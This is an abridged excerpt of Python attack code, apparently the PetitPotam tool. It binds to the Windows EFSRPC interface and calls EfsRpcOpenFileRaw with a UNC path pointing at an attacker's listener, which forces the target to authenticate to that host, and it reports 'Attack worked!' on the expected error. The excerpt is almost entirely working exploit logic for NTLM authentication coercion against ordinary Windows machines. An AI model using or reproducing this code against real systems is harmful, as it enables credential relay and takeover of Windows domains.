...
class CoerceAuth():
    def connect(self, username, password, domain, lmhash, nthash, target, pipe):
        ...
        logging.critical("Binding to %s" % binding_params[pipe]['MSRPC_UUID_EFSR'][0])
        try:
            dce.bind(uuidtup_to_bin(binding_params[pipe]['MSRPC_UUID_EFSR']))
        except Exception as e:
            logging.error("Something went wrong, check error status => %s" % str(e)) 
            sys.exit()
        logging.critical("Successfully bound!")
        return dce
    ...
    def EfsRpcOpenFileRaw(self, dce, listener):
        ...
        try:
            ...
            request['fileName'] = '\\\\{}\\c$\\Boot.ini\x00'.format(listener)
            request['Flag'] = 0
            #request.dump()
            ...
            if str(e).find('ERROR_BAD_NETPATH') >= 0:
                ...
                logging.critical('Attack worked!')
                return True
            else:
                logging.error("Something went wrong, check error status => %s" % str(e)) 
                sys.exit()
